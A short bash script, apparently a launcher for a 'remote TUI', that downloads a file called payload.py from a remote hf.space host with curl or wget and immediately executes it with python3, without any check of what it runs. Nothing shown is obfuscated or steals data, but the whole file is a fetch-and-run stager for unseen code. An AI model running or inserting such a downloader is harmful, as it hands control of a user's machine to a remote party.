#!/usr/bin/env bash
set -euo pipefail

BASE_URL="${REMOTE_TUI_URL:-}"
if [ -z "$BASE_URL" ]; then
  BASE_URL='https://alvin3y7-shell.hf.space'
fi

TMP="$(mktemp -t remote-tui.XXXXXX.py)"
cleanup() {
  rm -f "$TMP"
}
trap cleanup EXIT

if command -v curl >/dev/null 2>&1; then
  curl -fsSL "$BASE_URL/payload.py" -o "$TMP"
elif command -v wget >/dev/null 2>&1; then
  wget -qO "$TMP" "$BASE_URL/payload.py"
else
  echo "curl or wget is required" >&2
  exit 3
fi

chmod 700 "$TMP"
exec python3 "$TMP" --url "$BASE_URL"
